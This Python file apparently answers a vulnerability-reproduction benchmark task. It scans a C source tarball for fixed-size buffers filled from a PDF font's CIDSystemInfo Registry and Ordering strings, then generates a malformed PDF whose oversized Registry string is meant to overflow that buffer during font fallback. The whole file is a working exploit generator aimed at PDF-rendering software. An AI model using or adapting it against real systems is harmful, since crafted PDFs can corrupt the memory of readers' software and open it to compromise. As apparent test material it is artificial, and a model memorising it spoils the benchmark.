import io
import os
import re
import tarfile
from bisect import bisect_left
from typing import Optional, Tuple, List


class Solution:
    def solve(self, src_path: str) -> bytes:
        bufsize, conf = self._infer_fallback_bufsize_from_source(src_path)
        if bufsize is not None and conf >= 4:
            reg_len = max(1, bufsize + 16)
        else:
            reg_len = 66000  # conservative; below ground-truth size while likely exceeding vulnerable fixed buffers
        ordering_len = 1
        return self._build_pdf_cidfont_cidsysteminfo_overflow(reg_len, ordering_len)

    @staticmethod
    def _near(pos: int, positions: List[int], dist: int) -> bool:
        if not positions:
            return False
        i = bisect_left(positions, pos)
        if i < len(positions) and abs(positions[i] - pos) <= dist:
            return True
        if i > 0 and abs(positions[i - 1] - pos) <= dist:
            return True
        return False

    @staticmethod
    def _find_decl_size(text: str, var: str, before_pos: int) -> Optional[int]:
        start = max(0, before_pos - 12000)
        window = text[start:before_pos]
        decl_re = re.compile(r'(?:^|[;\n\r\t {}])(?:const\s+)?(?:unsigned\s+)?char\s+' + re.escape(var) + r'\s*\[\s*(\d{1,7})\s*\]')
        last = None
        for m in decl_re.finditer(window):
            last = m
        if last:
            try:
                val = int(last.group(1))
                if 4 <= val <= 5000000:
                    return val
            except Exception:
                return None

        decl_re2 = re.compile(r'(?:^|[;\n\r\t {}])(?:const\s+)?char\s+' + re.escape(var) + r'\s*\[\s*(\d{1,7})\s*\]')
        last = None
        for m in decl_re2.finditer(window):
            last = m
        if last:
            try:
                val = int(last.group(1))
                if 4 <= val <= 5000000:
                    return val
            except Exception:
                return None
        return None

    def _extract_candidates_from_text(self, text: str) -> List[Tuple[int, int]]:
        if '"Registry"' not in text or '"Ordering"' not in text:
            return []
        reg_idx = [m.start() for m in re.finditer(r'"Registry"', text)]
        ord_idx = [m.start() for m in re.finditer(r'"Ordering"', text)]
        cid_idx = [m.start() for m in re.finditer(r'CIDSystemInfo', text)]
        candidates: List[Tuple[int, int]] = []

        # sprintf-style
        fmt_call_re = re.compile(
            r'\b(?:(?:fz_)?sprintf)\s*\(\s*([A-Za-z_][A-Za-z0-9_]*)\s*,[^;]{0,600}?"%s-%s"',
            re.S
        )
        for m in fmt_call_re.finditer(text):
            pos = m.start()
            var = m.group(1)
            if not self._near(pos, reg_idx, 8000):
                continue
            if not self._near(pos, ord_idx, 8000):
                continue
            size = self._find_decl_size(text, var, pos)
            if not size:
                continue
            window = text[max(0, pos - 20000):min(len(text), pos + 20000)].lower()
            conf = 0
            conf += 1  # reg near
            conf += 1  # ord near
            if self._near(pos, cid_idx, 50000):
                conf += 2
            if "cidfont" in window or "cid_font" in window:
                conf += 1
            if "fallback" in window:
                conf += 1
            candidates.append((size, conf))

        # strcat(buf,"-") style
        strcat_dash_re = re.compile(r'\bstrcat\s*\(\s*([A-Za-z_][A-Za-z0-9_]*)\s*,\s*"-"\s*\)')
        for m in strcat_dash_re.finditer(text):
            pos = m.start()
            var = m.group(1)
            if not self._near(pos, reg_idx, 12000):
                continue
            if not self._near(pos, ord_idx, 12000):
                continue
            size = self._find_decl_size(text, var, pos)
            if not size:
                continue
            window = text[max(0, pos - 24000):min(len(text), pos + 24000)].lower()
            conf = 0
            conf += 1
            conf += 1
            if self._near(pos, cid_idx, 80000):
                conf += 2
            if "cidfont" in window or "cid_font" in window:
                conf += 1
            if "fallback" in window:
                conf += 1
            candidates.append((size, conf))

        return candidates

    def _infer_fallback_bufsize_from_source(self, src_path: str) -> Tuple[Optional[int], int]:
        if not src_path or not os.path.exists(src_path):
            return None, 0

        best_size = None
        best_conf = 0

        try:
            with tarfile.open(src_path, "r:*") as tf:
                for m in tf.getmembers():
                    if not m.isfile():
                        continue
                    name = m.name.lower()
                    if not (name.endswith(".c") or name.endswith(".cc") or name.endswith(".cpp") or name.endswith(".h") or name.endswith(".hpp")):
                        continue
                    if m.size <= 0 or m.size > 8_000_000:
                        continue
                    f = tf.extractfile(m)
                    if f is None:
                        continue
                    try:
                        data = f.read()
                    finally:
                        f.close()
                    if b"Registry" not in data or b"Ordering" not in data:
                        continue
                    if b"%s-%s" not in data and b'strcat' not in data and b'sprintf' not in data:
                        continue
                    try:
                        text = data.decode("latin1", errors="ignore")
                    except Exception:
                        continue

                    for size, conf in self._extract_candidates_from_text(text):
                        if conf > best_conf or (conf == best_conf and (best_size is None or size < best_size)):
                            best_size = size
                            best_conf = conf
        except Exception:
            return None, 0

        return best_size, best_conf

    @staticmethod
    def _build_pdf_cidfont_cidsysteminfo_overflow(reg_len: int, ordering_len: int) -> bytes:
        if reg_len < 1:
            reg_len = 1
        if ordering_len < 0:
            ordering_len = 0

        registry = b"A" * reg_len
        ordering = b"B" * ordering_len

        # Keep names short for smaller file while still reaching the code path.
        basefont_name = b"/X"
        font_res_name = b"F1"

        content = b"BT /" + font_res_name + b" 12 Tf 72 720 Td (A) Tj ET\n"
        stream_obj = b"<< /Length " + str(len(content)).encode("ascii") + b" >>\nstream\n" + content + b"endstream"

        # Objects 1..7
        objs = []

        # 1: Catalog
        objs.append(b"<< /Type /Catalog /Pages 2 0 R >>")

        # 2: Pages
        objs.append(b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>")

        # 3: Page
        objs.append(
            b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] "
            b"/Resources << /Font << /" + font_res_name + b" 4 0 R >> >> "
            b"/Contents 7 0 R >>"
        )

        # 4: Type0 font
        objs.append(
            b"<< /Type /Font /Subtype /Type0 /BaseFont " + basefont_name +
            b" /Encoding /Identity-H /DescendantFonts [5 0 R] >>"
        )

        # 5: CIDFontType0 descendant
        # CIDSystemInfo strings are the payload.
        objs.append(
            b"<< /Type /Font /Subtype /CIDFontType0 /BaseFont " + basefont_name +
            b" /CIDSystemInfo << /Registry (" + registry + b") /Ordering (" + ordering + b") /Supplement 0 >>"
            b" /FontDescriptor 6 0 R /DW 1000 >>"
        )

        # 6: FontDescriptor (no embedded font file => forces fallback/substitution path)
        objs.append(
            b"<< /Type /FontDescriptor /FontName " + basefont_name +
            b" /Flags 4 /FontBBox [0 0 1000 1000] /ItalicAngle 0 /Ascent 1000 /Descent 0 /CapHeight 1000 /StemV 80 >>"
        )

        # 7: Content stream
        objs.append(stream_obj)

        header = b"%PDF-1.4\n%\xe2\xe3\xcf\xd3\n"
        out = bytearray()
        out += header

        offsets = [0]
        for i, obj in enumerate(objs, start=1):
            offsets.append(len(out))
            out += str(i).encode("ascii") + b" 0 obj\n"
            out += obj + b"\nendobj\n"

        xref_pos = len(out)
        n = len(objs)

        out += b"xref\n0 " + str(n + 1).encode("ascii") + b"\n"
        out += b"0000000000 65535 f \n"
        for i in range(1, n + 1):
            off = offsets[i]
            out += f"{off:010d} 00000 n \n".encode("ascii")

        out += b"trailer\n<< /Size " + str(n + 1).encode("ascii") + b" /Root 1 0 R >>\n"
        out += b"startxref\n" + str(xref_pos).encode("ascii") + b"\n%%EOF\n"
        return bytes(out)